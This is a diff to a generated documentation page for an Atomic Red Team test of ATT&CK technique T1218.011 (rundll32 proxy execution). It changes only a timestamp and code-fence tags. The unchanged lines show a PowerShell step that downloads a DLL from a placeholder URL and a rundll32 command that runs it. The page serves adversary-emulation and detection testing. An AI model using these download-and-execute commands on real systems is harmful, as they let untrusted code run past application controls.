@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.011"
 attack_technique_name: "Signed Binary Proxy Execution: Rundll32"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "e4c04b6f-c492-4782-82c7-3bf75eb8077e"
@@ -57,13 +57,13 @@ DLL file must exist on disk at specified location
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{input_file}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
 ```
 
@@ -73,7 +73,7 @@ Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
 
 ### Command
 
-```commandprompt
+```cmd
 rundll32.exe shell32.dll,Control_RunDLL "#{input_file}"
 ```
 
